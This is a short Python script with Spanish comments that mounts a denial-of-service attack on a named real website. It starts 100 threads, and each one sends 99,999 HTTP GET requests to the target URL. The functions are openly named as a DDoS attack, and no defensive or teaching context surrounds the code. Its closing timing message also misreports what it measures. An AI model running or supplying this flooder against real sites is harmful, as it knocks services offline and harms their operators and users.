import requests
import threading
import time

url_objetivo = "https://namso.net"  # Reemplazar con la URL objetivo
cantidad_peticiones = 99999  # Cantidad de peticiones a realizar

def realizar_ataque_ddos():
    for i in range(cantidad_peticiones):
        response = requests.get(url_objetivo)
        response.raise_for_status()

def iniciar_ataque():
    start_time = time.time()
    
    for i in range(100):
        threading.Thread(target=realizar_ataque_ddos).start()
    
    elapsed_time = time.time() - start_time
    print(f"Se realizaron {cantidad_peticiones} peticiones en {elapsed_time} segundos.")

iniciar_ataque()
